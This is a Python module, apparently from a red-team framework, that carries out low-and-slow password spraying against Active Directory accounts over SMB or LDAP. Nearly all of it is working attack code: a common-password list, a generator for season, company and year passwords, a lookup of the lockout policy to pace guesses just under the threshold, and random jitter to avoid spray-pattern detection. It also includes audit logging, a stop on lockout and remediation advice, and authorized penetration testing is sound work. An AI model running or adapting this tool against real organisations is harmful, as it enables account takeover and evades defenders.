"""
Password Spray — Low-and-Slow Authentication Testing
MITRE: T1110.003

Tries ONE password against MANY accounts to avoid lockouts.
Built-in lockout protection:
  - Configurable max attempts per account (default: 1 per spray round)
  - Minimum delay between sprays (default: 30 minutes)
  - Stops automatically on first lockout signal
"""
from __future__ import annotations

import asyncio
import time
from typing import Any

from ares.core.logger import get_logger, audit
from ares.core.campaign import Finding, Severity
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.credential.pass_spray")

# Passwords that are statistically common in enterprise environments
DEFAULT_SPRAY_PASSWORDS = [
    "Password1", "Password1!", "Welcome1", "Welcome1!",
    "Summer2024!", "Winter2024!", "Spring2024!", "Autumn2024!",
    "Company2024!", "Company2024",
    "Passw0rd!", "P@ssw0rd",
]


# ── Password policy query ─────────────────────────────────────────────────────

def query_password_policy(
    dc: str, domain: str, username: str, password: str,
) -> dict[str, Any]:
    """
    Query AD domain password policy via LDAP.
    Returns lockout threshold, observation window, min password length, etc.
    Uses this to auto-calculate the safest spray rate.

    Returns dict with:
        lockout_threshold       — max failed attempts before lockout (0 = no lockout)
        lockout_duration_min    — minutes until auto-unlock
        observation_window_min  — minutes before failed-attempt counter resets
        min_password_length     — minimum password length enforced
        password_history_length — number of remembered passwords
        safe_spray_delay_s      — calculated safe delay between attempts per user
        safe_attempts_per_user  — max attempts per user before lockout risk
    """
    result: dict[str, Any] = {"error": None, "policy_found": False}
    try:
        import ldap3
        import ssl
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls = ldap3.Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server = ldap3.Server(dc, port=port, use_ssl=use_ssl,
                                      tls=tls, connect_timeout=10)
                conn = ldap3.Connection(
                    server, user=f"{domain.upper()}\\{username}",
                    password=password, authentication=ldap3.NTLM,
                    auto_bind=ldap3.AUTO_BIND_NONE, receive_timeout=15,
                )
                if conn.bind():
                    break
                conn = None
            except Exception:
                conn = None
        if not conn:
            result["error"] = "LDAP bind failed — cannot query password policy"
            return result

        base_dn = ",".join(f"DC={p}" for p in domain.upper().split("."))
        conn.search(base_dn, "(objectClass=domain)",
                     search_scope=ldap3.BASE,
                     attributes=[
                         "lockoutThreshold", "lockoutDuration",
                         "lockOutObservationWindow", "minPwdLength",
                         "pwdHistoryLength", "maxPwdAge",
                     ])
        if conn.entries:
            entry = conn.entries[0]

            def _ad_duration_to_minutes(val: Any) -> int:
                """Convert AD large integer duration (negative 100ns ticks) to minutes."""
                try:
                    v = abs(int(str(val)))
                    return max(1, v // (10_000_000 * 60))
                except (ValueError, TypeError):
                    return 30  # safe default

            threshold = int(str(entry.lockoutThreshold)) if hasattr(entry, "lockoutThreshold") else 0
            duration  = _ad_duration_to_minutes(entry.lockoutDuration) if hasattr(entry, "lockoutDuration") else 30
            window    = _ad_duration_to_minutes(entry.lockOutObservationWindow) if hasattr(entry, "lockOutObservationWindow") else 30
            min_len   = int(str(entry.minPwdLength)) if hasattr(entry, "minPwdLength") else 7
            history   = int(str(entry.pwdHistoryLength)) if hasattr(entry, "pwdHistoryLength") else 24

            # Calculate safe spray parameters
            if threshold == 0:
                safe_attempts = 10   # no lockout policy — still be cautious
                safe_delay    = 5.0
            else:
                safe_attempts = max(1, threshold - 2)  # stay 2 below threshold
                # Wait for observation window + 20% buffer before next round
                safe_delay = (window * 60 * 1.2) / max(safe_attempts, 1)

            result.update({
                "policy_found":           True,
                "lockout_threshold":      threshold,
                "lockout_duration_min":   duration,
                "observation_window_min": window,
                "min_password_length":    min_len,
                "password_history_length": history,
                "safe_spray_delay_s":     round(safe_delay, 1),
                "safe_attempts_per_user": safe_attempts,
            })
        conn.unbind()
    except ImportError:
        result["error"] = "ldap3 not installed"
    except Exception as exc:
        result["error"] = str(exc)[:150]
    return result


def generate_smart_wordlist(
    company_name: str = "",
    domain: str = "",
    year: int | None = None,
    extra_words: list[str] | None = None,
) -> list[str]:
    """
    Generate context-aware password candidates from company name and domain.

    Patterns based on real-world password analysis (NIST SP 800-63B appendix):
      - Season+Year+Special   (Summer2024!, Winter2025!)
      - Company+Digits+Special (Acme2024!, AcmeCorp1)
      - Month+Year            (January2025!, March2025)
      - Common keyboard walks  (Qwerty123!, Qwaz2024!)
      - Domain-derived         (CorpLocal1!, Corp2024!)

    Returns deduplicated list sorted by likelihood (most common patterns first).
    """
    import datetime
    if year is None:
        year = datetime.datetime.now().year

    passwords: list[str] = []
    years = [str(year), str(year - 1)]
    seasons = ["Spring", "Summer", "Autumn", "Winter", "Fall"]
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    suffixes = ["!", "1", "1!", "123", "123!", "@1", "#1"]

    # Season + Year patterns (most common enterprise password pattern)
    for s in seasons:
        for y in years:
            for sfx in suffixes:
                passwords.append(f"{s}{y}{sfx}")

    # Company name patterns
    if company_name:
        bases = [company_name, company_name.capitalize(),
                 company_name.upper(), company_name.lower()]
        # Remove spaces and common suffixes
        for base in bases:
            clean = base.replace(" ", "").replace(",", "").replace(".", "")
            for y in years:
                for sfx in suffixes:
                    passwords.append(f"{clean}{y}{sfx}")
            passwords.extend([f"{clean}1", f"{clean}!", f"{clean}@1",
                              f"{clean}Pass1!", f"{clean}2024!"])

    # Domain-derived patterns
    if domain:
        parts = domain.replace(".", " ").split()
        for part in parts:
            cap = part.capitalize()
            for y in years:
                for sfx in suffixes:
                    passwords.append(f"{cap}{y}{sfx}")

    # Month + Year (common after mandatory password resets)
    for m in months[:6]:  # focus on recent months
        for y in years:
            passwords.extend([f"{m}{y}!", f"{m}{y}1", f"{m}{y}"])

    # Static common passwords
    passwords.extend([
        "Password1!", "P@ssw0rd!", "Passw0rd1!", "Welcome1!",
        "Changeme1!", "Letmein1!", "Qwerty123!",
    ])

    # Extra words from operator
    for word in (extra_words or []):
        for y in years:
            for sfx in suffixes:
                passwords.append(f"{word}{y}{sfx}")

    # Deduplicate preserving order
    seen: set[str] = set()
    unique: list[str] = []
    for p in passwords:
        if p not in seen:
            seen.add(p)
            unique.append(p)
    return unique


class PassSprayModule(BaseModule):
    """
    credential.pass_spray — Low-and-slow password spray against domain accounts — built-in lockout protection, one password 

    OPSEC: MEDIUM
    MITRE: "T1110.003"
    REQUIRES: "user_list"
    OUTPUTS:  "valid_credentials"
    """
    MODULE_ID          = "credential.pass_spray"
    MODULE_NAME        = "Password Spray"
    MODULE_CATEGORY    = "credential"
    MODULE_DESCRIPTION = (
        "Low-and-slow password spray against domain accounts — "
        "built-in lockout protection, one password per round"
    )
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["user_list"]
    OUTPUTS            = ["valid_credentials"]
    MITRE_TECHNIQUES   = ["T1110.003"]

    async def validate(self, ctx: "Any") -> None:
        """Enforce target, user list, and password list before spray."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target    = getattr(ctx, "target", "") or ctx.params.get("target", "")
        users     = ctx.params.get("users", [])
        passwords = ctx.params.get("passwords", [])
        if not target:
            raise ModuleValidationError(
                "credential.pass_spray requires 'target' — DC IP or hostname.",
                module_id=self.MODULE_ID, field="target",
            )
        if not users:
            raise ModuleValidationError(
                "credential.pass_spray requires 'users' list — "
                "provide via params or pipe from ad.enum_users output.",
                module_id=self.MODULE_ID, field="users",
            )
        if not passwords:
            raise ModuleValidationError(
                "credential.pass_spray requires 'passwords' list.",
                module_id=self.MODULE_ID, field="passwords",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID, raw={"dry_run": True})
        target   = getattr(ctx, "target", ctx.params.get("target", ""))
        domain   = getattr(ctx, "domain", "") or ctx.params.get("domain", "")
        users    = ctx.params.get("users", [])
        passwords = ctx.params.get("passwords", DEFAULT_SPRAY_PASSWORDS[:1])
        params = dict(ctx.params)
        for key in ("target", "domain", "users", "passwords"):
            params.pop(key, None)
        findings, raw = await self.run(
            target=target, domain=domain, users=users, passwords=passwords, **params
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("credential.pass_spray")
    async def run(self, **kwargs: Any) -> tuple[list[Finding], dict[str, Any]]:
        target       = kwargs.get("target", "")
        domain       = kwargs.get("domain", "")
        users        = kwargs.get("users", [])
        passwords    = kwargs.get("passwords", DEFAULT_SPRAY_PASSWORDS[:1])
        dry_run      = kwargs.get("dry_run", False)
        delay_s      = float(kwargs.get("delay_seconds", 1.0))
        max_per_user = int(kwargs.get("max_attempts_per_user", 1))
        # LDAP mode: use ldap3 SIMPLE bind instead of SMB — fallback when port 445 blocked
        use_ldap     = bool(kwargs.get("use_ldap", False))
        ldap_port    = int(kwargs.get("ldap_port", 389))

        if not target or not users or not passwords:
            return [], {"error": "target, users list, and passwords required"}
        if dry_run:
            return [], {"dry_run": True, "would_spray": len(users) * len(passwords)}

        await self.before_request(target, "ldap")  # scope check + jitter

        # Detect whether SMB is reachable; auto-fallback to LDAP if not
        smb_available = False
        if not use_ldap:
            try:
                from impacket.smbconnection import SMBConnection  # type: ignore[import]
                smb_available = True
            except ImportError:
                use_ldap = True   # impacket missing — try ldap3

        if use_ldap or not smb_available:
            try:
                import ldap3 as _ldap3  # type: ignore[import]
                use_ldap = True
            except ImportError:
                return [], {"error": "Neither impacket nor ldap3 installed"}

        protocol = "ldap" if use_ldap else "smb"
        logger.info("pass_spray_start", target=target, user_count=len(users),
                    password_count=len(passwords), protocol=protocol)
        audit("pass_spray", actor="operator", technique="T1110.003",
              source="operator", target=target,
              detail=f"users={len(users)} passwords={len(passwords)} proto={protocol}")

        await self.noise.rate_limiter.acquire("cloud_api")

        valid_creds: list[dict[str, str]] = []
        locked_accounts: list[str] = []
        attempts = 0
        lockout_detected = False

        for password in passwords:
            if lockout_detected:
                break
            for user in users:
                if lockout_detected or user in locked_accounts:
                    continue

                # Jitter — random timing variation prevents regular spray pattern detection
                await self.noise.jitter.sleep()
                if delay_s > 0:
                    await asyncio.sleep(delay_s)

                def _try_login(u=user, p=password):
                    if use_ldap:
                        # LDAP SIMPLE bind — fallback when SMB 445 is blocked
                        try:
                            import ldap3
                            import ssl
                            use_ssl = (ldap_port == 636)
                            tls_arg = ldap3.Tls(validate=ssl.CERT_NONE) if use_ssl else None
                            server  = ldap3.Server(
                                target, port=ldap_port,
                                use_ssl=use_ssl, tls=tls_arg,
                                connect_timeout=8,
                            )
                            # SIMPLE bind — UPN format: user@domain
                            upn  = f"{u}@{domain}" if domain else u
                            conn = ldap3.Connection(
                                server, user=upn, password=p,
                                authentication=ldap3.SIMPLE,
                                auto_bind=ldap3.AUTO_BIND_NONE,
                                receive_timeout=8,
                            )
                            result = conn.bind()
                            conn.unbind()
                            if result:
                                return "success"
                            # Check LDAP result for lockout signals
                            desc = (conn.result or {}).get("description", "").lower()
                            if "locked" in desc or "account_locked" in desc:
                                return "locked"
                            return "wrong_password"
                        except Exception as e:
                            err = str(e).upper()
                            if "LOCKED" in err:
                                return "locked"
                            return "wrong_password"
                    else:
                        # SMB NTLM spray — standard mode
                        try:
                            from impacket.smbconnection import SMBConnection
                            smb = SMBConnection(target, target, timeout=8)
                            smb.login(u, p, domain)
                            smb.logoff()
                            return "success"
                        except Exception as e:
                            err = str(e).upper()
                            if "STATUS_ACCOUNT_LOCKED_OUT" in err or "ACCOUNT_LOCKED" in err:
                                return "locked"
                            if "STATUS_LOGON_FAILURE" in err or "WRONG_PASSWORD" in err:
                                return "wrong_password"
                            if "STATUS_PASSWORD_MUST_CHANGE" in err:
                                return "must_change"
                            return "error"

                loop = asyncio.get_running_loop()
                result = await loop.run_in_executor(None, _try_login)

                if result == "locked":
                    locked_accounts.append(user)
                    lockout_detected = True
                    logger.warning("pass_spray_lockout", user=user, target=target)
                    break
                elif result in ("success", "must_change"):
                    valid_creds.append({
                        "username": user, "password": password,
                        "domain": domain, "target": target,
                    })
                    logger.info("pass_spray_hit", user=user, target=target)
                    audit("pass_spray_success", actor="operator", technique="T1110.003",
                          source="operator", target=target, detail=f"user={user}")
                attempts += 1

        if valid_creds:
            for cred in valid_creds:
                # Store credential in vault — password NEVER appears in finding
                vault_id = ""
                try:
                    from ares.credential.vault import Credential, CredentialType, PrivilegeLevel
                    vault = getattr(self, "_vault", None) or getattr(self.campaign, "_vault", None)
                    if vault:
                        vc = Credential(
                            username=cred["username"], domain=cred["domain"],
                            cred_type=CredentialType.CLEARTEXT,
                            privilege=PrivilegeLevel.DOMAIN_USER,
                            source_module=self.MODULE_ID,
                            campaign_id=getattr(self.campaign, "id", ""),
                        )
                        vault_id = vault.store(vc, secret=cred["password"])
                except Exception:
                    pass  # vault unavailable — credential still in raw output for engine

                self.finding(
                    title=f"Password Spray Success: {domain}\\{cred['username']}",
                    description=(
                        f"Valid credentials found for {domain}\\{cred['username']}. "
                        "Password stored in credential vault (not shown in report). "
                        "Account uses a common/weak password susceptible to spray attacks."
                    ),
                    severity=Severity.CRITICAL,
                    mitre_technique="T1110.003",
                    mitre_tactic="Credential Access",
                    evidence={
                        "username": cred["username"],
                        "domain": cred["domain"],
                        "target": cred["target"],
                        "vault_credential_id": vault_id or "<not stored>",
                        "password": "***REDACTED***",
                    },
                    remediation=(
                        "Enforce password complexity policy (min 12 chars, no common patterns). "
                        "Enable Azure AD Password Protection or Fine-Grained Password Policy. "
                        "Implement MFA for all user accounts."
                    ),
                    host=target, confidence=1.0,
                )

        if locked_accounts:
            self.finding(
                title=f"Account Lockout Detected During Spray — {len(locked_accounts)} Account(s)",
                description=(
                    f"Password spray caused lockout for: {locked_accounts}. "
                    "Spray was stopped to prevent further lockouts."
                ),
                severity=Severity.MEDIUM,
                mitre_technique="T1110.003",
                mitre_tactic="Credential Access",
                evidence={"locked": locked_accounts},
                remediation=(
                    "Review SIEM for spray patterns. "
                    "Implement account lockout alert to SOC. "
                    "Unlock affected accounts and notify users."
                ),
                host=target, confidence=1.0,
            )

        raw = {
            "target": target, "domain": domain,
            "protocol": protocol,
            "attempts": attempts,
            "valid_credentials": [
                {"username": c["username"], "domain": c["domain"],
                 "target": c["target"], "password": "***REDACTED***"}
                for c in valid_creds
            ],
            "locked_accounts": locked_accounts,
            "lockout_detected": lockout_detected,
        }
        return self._findings[:], raw
